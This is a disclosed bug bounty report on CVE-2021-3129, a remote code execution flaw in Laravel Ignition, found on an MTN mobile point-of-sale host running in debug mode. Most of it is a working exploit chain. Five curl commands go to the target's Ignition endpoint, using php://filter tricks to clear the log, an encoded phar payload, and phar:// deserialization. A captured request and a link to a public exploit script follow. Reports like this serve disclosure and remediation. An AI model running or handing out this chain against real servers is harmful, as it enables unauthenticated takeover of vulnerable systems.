# Information disclosure due to debug mode enabled at Laravel instance https://mpos.mtn.co.sz/ 

## Report Details
- **Report ID**: 2765259
- **URL**: https://hackerone.com/reports/2765259
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-10-08T05:25:35.982Z
- **Disclosed**: 2025-02-23T09:03:31.950Z

## Reporter
- **Username**: odaysec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
CVE-2021-3129 is a Remote Code Execution vulnerability in the Laravel framework which takes advantage of unsafe usage of PHP. This vulnerability and the steps to exploit it follow a similar path to a classic log poisoning attack. In typical log poisoning, the attacker needs to exploit a local file inclusion first in order to achieve remote code execution, while in the Laravel framework, we need the Ignition module (Ignition is a page for displaying an error) and a specific chain to trigger this vulnerability. This security issue is relatively easy to exploit and does not require user authentication which is one of the reasons why it has a 9.8 CVSSv3 score.



{F3661989}

In Laravel ignition mode, we have a class named MakeViewVariableOptionalSolution which invokes both functions to be triggered by sending a POST request to `/_ignition/execute-solution`. It does this using a JSON payload which includes a viewFile `parameter`. The action of reading and writing a file doesn’t give us more insights, but PHP allows us to use filters like `php://filter/write=convert.base64-decode/resource=path/to/a/specific/file` , and `phar:///path/to/specific/file` to modify and execute PHP serializable code .  However, this is not enough to trigger RCE. Default Laravel has the log file in storage/logs/laravel.log which includes every PHP error. Writing malicious content with the purpose of decoding and executing it won’t work at first, because PHP ignores bad characters when decoding base64, so the error won’t be written in the Laravel log file. 

Moreover, the log file has more entries that affect our payload. Hopefully, we can invoke php:// again to clear the log file and have only our payload executed and injected twice. But we need one more step.  The length of the final payload in the log file is different from one target to another because of the absolute path, which could result in bad decoding of the base64 payload.  One of the last methods I tried to trigger the RCE is to use base64 decode for UTF-16, which aligns the payload for 2 bytes. In this case, the first payload is correctly decoded, thus the second one will be decoded correctly too. 

{F3662012}

```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```
```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "AA"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```
```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=..."}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```
```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```
```javascript
curl -XPOST -H 'Content-Type: application/json'  -d ‘{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "phar://../storage/logs/laravel.log"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution
```
 1. Navigate visit directory hostname on https://mpos.mtn.co.sz
 1. Intercept request to burp-suite and following directory parameter on `/srvgtw001/merchant/password/reset`

```
GET /srvgtw001/merchant/password/reset HTTP/1.1
Host: mpos.mtn.co.sz
Cookie: cookiesession1=678B28894C92B8E298EA67025D4086C2
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

 1. You can see the laravel-debug-enable 
 1. Lets save exploit bellow as `exploit.py`

```
https://raw.githubusercontent.com/joshuavanderpoll/CVE-2021-3129/refs/heads/main/CVE-2021-3129.py
```
 1. This script is designed to exploit the Remote Code Execution (RCE) vulnerability identified in several Laravel versions, known as CVE-2021-3129. By leveraging this vulnerability, the script allows users to write and execute commands on a target website running a vulnerable Laravel instance, provided that the "APP_DEBUG" configuration is set to "true" in the ".env" file.
 1. And the output of the command should be available in the last response received from the target.


{F3662009}

## Impact

Ignition, a popular debug tool in the Laravel ecosystem, played a crucial role in assisting developers during the application development process. However, its functionality came with a vulnerability that exposed websites using Laravel versions <= 8.4.2 with debug mode enabled to the risk of RCE attacks. This critical vulnerability allowed unauthenticated attackers to execute arbitrary code remotely, potentially wreaking havoc on application data, server resources, and user privacy.

## Attachments
- image.png
- image.png
- image.png
